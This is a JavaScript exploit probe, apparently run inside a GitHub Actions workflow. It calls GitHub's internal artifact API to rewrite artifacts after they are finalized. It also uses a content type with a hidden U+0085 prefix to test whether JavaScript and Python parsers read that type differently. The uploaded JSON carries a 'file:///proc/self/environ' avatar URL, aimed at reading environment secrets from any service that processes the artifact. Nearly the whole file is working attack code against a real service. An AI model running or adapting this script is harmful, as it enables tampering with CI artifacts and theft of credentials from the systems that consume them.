import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from './node_modules/@actions/artifact/lib/generated/index.js';

const twirp = internalArtifactTwirpClient();
const backend = getBackendIdsFromToken();
const repo = process.env.GITHUB_REPOSITORY;
const root = `https://api.github.com/repos/${repo}`;
const weird = '\u0085application/json';
const token = process.env.GITHUB_TOKEN;
const pause = ms => new Promise(resolve => setTimeout(resolve, ms));
const headers = {
  Authorization: `Bearer ${token}`,
  Accept: 'application/vnd.github.v3+json',
  'User-Agent': 'repo-cassette-transient-probe',
};

function payload(id) {
  return Buffer.from(JSON.stringify({
    full_name: `${repo}/actions/artifacts/${id}/zip`,
    owner: { avatar_url: 'file:///proc/self/environ' },
  }));
}

async function create(name, version) {
  const mime = version === 6 ? weird : 'application/json';
  const result = await twirp.CreateArtifact({
    ...backend, name, version, mimeType: StringValue.create({ value: mime }),
  });
  if (!result.ok || !result.signedUploadUrl) throw Error(`Create v${version} failed`);
  return { version, url: result.signedUploadUrl };
}

async function upload(url, data) {
  const blob = new BlobClient(url).getBlockBlobClient();
  await blob.uploadData(data, {
    blobHTTPHeaders: { blobContentType: weird },
  });
}

async function finalize(name, size) {
  const result = await twirp.FinalizeArtifact({ ...backend, name, size: String(size) });
  if (!result.ok || !result.artifactId) throw Error('Finalize failed');
  return String(result.artifactId);
}

async function inspect(id) {
  const first = await fetch(`${root}/actions/artifacts/${id}/zip`, {
    headers, redirect: 'manual', signal: AbortSignal.timeout(4000),
  });
  if (first.status !== 302) return { id, status: first.status };
  const location = first.headers.get('location');
  if (!location?.startsWith('https://')) return { id, status: first.status, error: 'no https location' };
  const response = await fetch(location, { signal: AbortSignal.timeout(4000) });
  const data = Buffer.from(await response.arrayBuffer());
  const ct = response.headers.get('content-type') ?? '';
  const head = ct.split(',')[0].split(';')[0];
  const js = head.trim().toLowerCase();
  const py = head.replace(/^[\s\u0085]+|[\s\u0085]+$/gu, '').toLowerCase();
  return {
    id, status: response.status, ct, match: data.equals(payload(id)),
    candidate: response.ok && data.equals(payload(id)) && js !== 'application/json' && py === 'application/json',
  };
}

async function remove(id) {
  const response = await fetch(`${root}/actions/artifacts/${id}`, {
    method: 'DELETE', headers, signal: AbortSignal.timeout(4000),
  });
  console.log('DELETE', JSON.stringify({ id, status: response.status }));
}


for (let i = 0; i < 2; i++) {
  const firstVersion = i === 0 ? 6 : 7;
  const secondVersion = i === 0 ? 7 : 6;
  const name = `postfinal-${process.env.GITHUB_RUN_ID}-${i}`;
  const ids = new Set();
  try {
    const first = await create(name, firstVersion);
    await upload(first.url, Buffer.from('{}'));
    const firstId = await finalize(name, 2);
    ids.add(firstId);
    await upload(first.url, payload(firstId));
    console.log('BEFORE', JSON.stringify({ i, ...await inspect(firstId) }));
    const second = await Promise.race([create(name, secondVersion), pause(4000).then(() => null)]);
    console.log('RECREATE', JSON.stringify({ i, success: !!second, secondVersion }));
    console.log('AFTER_CREATE', JSON.stringify({ i, ...await inspect(firstId) }));
    if (second) {
      await upload(second.url, payload(firstId));
      console.log('AFTER_UPLOAD', JSON.stringify({ i, ...await inspect(firstId) }));
      const secondId = await Promise.race([finalize(name, payload(firstId).length), pause(4000).then(() => null)]);
      console.log('SECOND_FINALIZE', JSON.stringify({ i, secondId }));
      if (secondId) ids.add(secondId);
      for (const id of ids) console.log('AFTER_FINALIZE', JSON.stringify({ i, ...await inspect(id) }));
    }
  } catch (error) {
    console.log('ATTEMPT_ERROR', JSON.stringify({ i, error: String(error).slice(0,180) }));
  }
  for (const id of ids) {
    try { await remove(id); } catch (error) { console.log('DELETE_ERROR', String(error)); }
  }
}
console.log('SUMMARY', JSON.stringify({ attempts: 2 }));
process.exit(0);
